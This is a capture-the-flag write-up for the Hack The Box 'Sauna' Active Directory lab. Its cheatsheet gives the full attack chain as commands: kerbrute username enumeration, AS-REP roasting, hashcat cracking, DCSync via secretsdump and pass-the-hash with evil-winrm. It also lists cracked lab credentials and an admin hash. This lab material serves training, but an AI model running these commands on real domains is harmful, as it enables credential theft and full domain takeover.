# Sauna \[Windows AD Easy]

## Report

Create user list from web application and bruteforce valid usernames using kerbrute to find 'fsmith' who is ASREPRoastable.

Running winPEAS reveals auto logon creds for user 'svc\_loanmgr' and bloodhound reveals this user has DCSync privs. Run secretsdump.py to expose Admin creds

## Cheatsheet

```
(name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
DomainName:EGOTISTICALBANK                                                                                      
Domain Sid: S-1-5-21-2966785786-3096785034-1186376766

./kerbrute_linux_amd64 userenum -d egotistical-bank.local  ~/htb/sauna/newuser.txt --dc egotistical-bank.local -v | grep 'VALID' 

./GetNPUsers.py -no-pass -dc-ip 10.10.10.175 -request 'egotistical-bank.local/fsmith'
hashcat64.exe -m 18200 hash.txt rockyou.txt -d 1

winPEAS to find svc_loanmgr:Moneymakestheworldgoround!
bloodhound to find DCSync
sudo python3 secretsdump.py egotistical-bank.local/svc_loanmgr@10.10.10.175
evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff
```

## Loot

### Creds

```
2025/06/12 00:35:02 >  [+] VALID USERNAME:       fsmith@egotistical-bank.local
fsmith:Thestrokes23
```

### Proof

What is a DCSync attack?

We pretend to be another DC and tell the DC hey I'm a DC as well so we gotta sync our passwords to keep the data consistent via Directory Replication Services (DRS) Remote Protocol and they oblige, returning the hashes for all accounts.

This can be used by wmiexec, psexec or evil-winrm

```
Using the DRSUAPI method to get NTDS.DIT secrets
```
